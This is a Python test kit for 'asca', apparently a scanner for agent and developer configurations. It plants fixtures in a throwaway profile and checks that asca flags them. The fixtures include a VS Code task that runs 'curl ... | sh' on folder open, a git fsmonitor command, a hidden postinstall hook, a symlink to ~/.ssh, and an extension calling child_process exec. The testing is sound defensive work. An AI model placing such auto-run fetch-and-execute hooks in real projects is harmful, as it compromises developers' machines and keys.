#!/usr/bin/env python3
"""asca platform test kit: plant known problems in a throwaway profile, run asca, print a pass/fail table.

Made for the Windows test (docs/windows.md) but runs on any OS. Everything happens in a temporary
folder used as the home/profile directory (HOME, USERPROFILE, APPDATA, LOCALAPPDATA point there),
so your real profile, agent configs and keys are never read or changed. Fake secrets are generated
at runtime and never printed. Output is shape only: rule, severity, PASS/FAIL, exit codes, and the
last line of any crash, safe to paste into a chat or issue.

    py scripts\\platform_check.py          (Windows)
    python3 scripts/platform_check.py     (macOS / Linux)
"""
from __future__ import annotations

import json
import os
import platform
import random
import string
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
RNG = random.Random(20261121)
IS_WIN = os.name == "nt"


def fake(prefix: str, n: int) -> str:
    return prefix + "".join(RNG.choice(string.ascii_letters + string.digits) for _ in range(n))


def app_support(home: Path) -> Path:
    if IS_WIN:
        return home / "AppData" / "Roaming"
    if sys.platform == "darwin":
        return home / "Library" / "Application Support"
    return home / ".config"


def plant(home: Path) -> dict:
    """Create the fixtures; returns facts the checks need (paths, whether symlinks worked, …)."""
    facts: dict = {}
    sup = app_support(home)
    unpinned = {"mcpServers": {"fs": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "."]}}}
    (sup / "Claude").mkdir(parents=True, exist_ok=True)
    (sup / "Claude" / "claude_desktop_config.json").write_text(json.dumps(unpinned), encoding="utf-8")
    (sup / "Code" / "User").mkdir(parents=True, exist_ok=True)
    (sup / "Code" / "User" / "mcp.json").write_text(json.dumps(
        {"servers": {"pup": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-puppeteer"]}}}),
        encoding="utf-8")
    sess = home / ".claude" / "projects" / "demo"
    sess.mkdir(parents=True, exist_ok=True)
    (sess / "s1.jsonl").write_text(json.dumps({"type": "tool_result", "content": "ANTHROPIC_API_KEY="
                                               + fake("sk-ant-api03-", 95)}) + "\n", encoding="utf-8")
    repo = home / "work" / "take-home"
    (repo / ".git").mkdir(parents=True, exist_ok=True)
    marker = home / "FSMONITOR_RAN"
    facts["marker"] = marker
    cmd = f'cmd /c "echo x > {marker}"' if IS_WIN else f"touch {marker}"
    (repo / ".git" / "config").write_text(f"[core]\n\trepositoryformatversion = 0\n\tfsmonitor = {cmd}\n",
                                          encoding="utf-8")
    (repo / ".git" / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")
    (repo / ".vscode").mkdir(exist_ok=True)
    (repo / ".vscode" / "tasks.json").write_text(json.dumps({"version": "2.0.0", "tasks": [{
        "label": "init", "type": "shell", "command": f"curl -s https://example.invalid/i | sh",
        "runOptions": {"runOn": "folderOpen"}}]}), encoding="utf-8")
    (repo / "package.json").write_text(json.dumps({"name": "t", "scripts": {
        "postinstall": 'sh ./.ci-dwgd2n.sh >/dev/null 2>&1; _r=$?; if [ "$_r" -eq 42 ]; then exit 42; fi'}}),
        encoding="utf-8")
    (home / ".ssh").mkdir(exist_ok=True)
    try:
        os.symlink(str(home / ".ssh"), str(repo / "fixtures"), target_is_directory=True)
        facts["symlink"] = True
    except (OSError, NotImplementedError):
        facts["symlink"] = False          # Windows without Developer Mode / admin
    ext = home / ".vscode" / "extensions" / "acme.helper-1.0.0"
    ext.mkdir(parents=True, exist_ok=True)
    (ext / "package.json").write_text(json.dumps({"name": "helper", "publisher": "acme", "version": "1.0.0"}),
                                      encoding="utf-8")
    (ext / "extension.js").write_text("module.exports = {};\n", encoding="utf-8")
    facts["ext_js"] = ext / "extension.js"
    facts["repo"] = repo
    return facts


def run(args: list[str], env: dict, cwd: Path = ROOT) -> tuple[int, str]:
    p = subprocess.run([sys.executable, "-m", *args], cwd=cwd, env=env, capture_output=True, text=True,
                       encoding="utf-8", errors="replace", timeout=600)
    crash = ""
    if "Traceback (most recent call last)" in p.stderr:
        crash = [ln for ln in p.stderr.strip().splitlines() if ln.strip()][-1][:200]
    return p.returncode, crash


def main() -> int:
    rows: list[tuple[str, str, str]] = []
    crashes: list[str] = []
    with tempfile.TemporaryDirectory(prefix="asca-platform-") as tmp:
        home = Path(tmp) / "profile"
        home.mkdir()
        facts = plant(home)
        env = {k: v for k, v in os.environ.items() if not k.startswith(("ASCA_", "HERMES_"))}
        env.update(HOME=str(home), USERPROFILE=str(home), APPDATA=str(home / "AppData" / "Roaming"),
                   LOCALAPPDATA=str(home / "AppData" / "Local"), PYTHONIOENCODING="utf-8")
        out = Path(tmp) / "audit"
        rc, crash = run(["asca", "--no-hermes", "--repos", str(home / "work"), "--format", "none", "-o", str(out)], env)
        rows.append(("audit runs", "exit 1 (findings)", "PASS" if rc == 1 else f"FAIL (exit {rc})"))
        if crash:
            crashes.append(f"audit: {crash}")
        try:
            doc = json.loads(out.with_suffix(".json").read_text(encoding="utf-8"))
            found = [(f["rule"], f["severity"], f.get("location", "")) for f in doc["findings"] if not f.get("suppressed")]
        except (OSError, ValueError, KeyError):
            found = []

        def expect(label: str, rule: str, sev: str, where: str = "") -> None:
            hits = [s for r, s, loc in found if r == rule and where.lower() in loc.lower().replace("\\", "/")]
            got = ",".join(sorted(set(hits))) or "none"
            rows.append((label, f"{rule} {sev}", "PASS" if sev in hits else f"FAIL (got {got})"))

        expect("Claude Desktop MCP, unpinned npx", "pin.mcp-package", "high", "claude_desktop_config.json")
        expect("VS Code MCP, archived Puppeteer", "mcp.archived-server", "high", "code/user/mcp.json")
        expect("key in a Claude Code transcript", "secret.session-history", "high", ".claude")
        expect("git core.fsmonitor in a repo", "git.fsmonitor", "critical", "take-home")
        expect("VS Code folderOpen task", "repo.agent-hook", "high", "tasks.json")
        expect("wfx postinstall hook", "repo.wfx-indicator", "critical", "package.json")
        if facts["symlink"]:
            expect("symlink to ~/.ssh in a repo", "repo.symlink-escape", "high", "fixtures")
        else:
            rows.append(("symlink to ~/.ssh in a repo", "repo.symlink-escape high",
                         "SKIP (can't create symlinks: enable Developer Mode)"))
        if IS_WIN:
            expect("permissions note on Windows", "scanner.permissions-not-checked", "low")
        rows.append(("fsmonitor command never ran", "no marker file",
                     "PASS" if not facts["marker"].exists() else "FAIL (asca ran repo config!)"))
        parse_errors = sorted({r for r, s, loc in found if r.startswith("scanner.parse")})
        rows.append(("no parse errors", "none", "PASS" if not parse_errors else f"FAIL ({', '.join(parse_errors)})"))

        inv = ["asca", "inventory", "--dir", str(Path(tmp) / "inv"), "--home", str(home), "--no-hermes",
               "--format", "none", "-o", str(Path(tmp) / "inv.json")]
        rc, crash = run(inv, env)
        rows.append(("inventory first run learns", "exit 0", "PASS" if rc == 0 else f"FAIL (exit {rc})"))
        crashes += [f"inventory: {crash}"] if crash else []
        facts["ext_js"].write_text("require('child_process').exec('id');\n", encoding="utf-8")
        rc, crash = run(inv, env)
        try:
            inv_rules = sorted({f["rule"] for f in json.loads((Path(tmp) / "inv.json").read_text(encoding="utf-8"))
                               ["findings"]})
        except (OSError, ValueError, KeyError):
            inv_rules = []
        changed = [r for r in inv_rules if r.startswith("inventory.") and ("chang" in r or "tamper" in r)]
        rows.append(("inventory sees a changed extension", "an inventory change finding",
                     "PASS" if changed else f"FAIL (exit {rc}, rules {inv_rules})"))
        crashes += [f"inventory 2nd run: {crash}"] if crash else []
        for label, args, want in [
            ("check-repo verdict", ["asca", "check-repo", str(facts["repo"])], {1}),
            ("asca-skills scan", ["asca.skillscan", "scan", "--format", "none"], {0, 1, 3}),
            ("dashboard builds", ["asca", "dashboard", "--state-dir", str(Path(tmp)), "-o", str(Path(tmp) / "d.html"),
                                  "--quiet"], {0}),
            ("export intune", ["asca", "export", "intune", "--report", str(out.with_suffix(".json"))], {0}),
        ]:
            rc, crash = run(args, env)
            rows.append((label, "exit " + "/".join(map(str, sorted(want))), "PASS" if rc in want else f"FAIL (exit {rc})"))
            if crash:
                crashes.append(f"{label}: {crash}")
    width = max(len(r[0]) for r in rows)
    print(f"asca platform check · {platform.system()} {platform.release()} {platform.machine()} · "
          f"Python {platform.python_version()}")
    for label, want, res in rows:
        print(f"  {label:<{width}}  {res:<8}  ({want})")
    print("crashes: " + ("none" if not crashes else "\n  " + "\n  ".join(crashes)))
    fails = sum(1 for r in rows if r[2].startswith("FAIL"))
    print(f"result: {len(rows) - fails}/{len(rows)} passed" + (f", {fails} failed" if fails else ""))
    return 1 if fails else 0


if __name__ == "__main__":
    raise SystemExit(main())
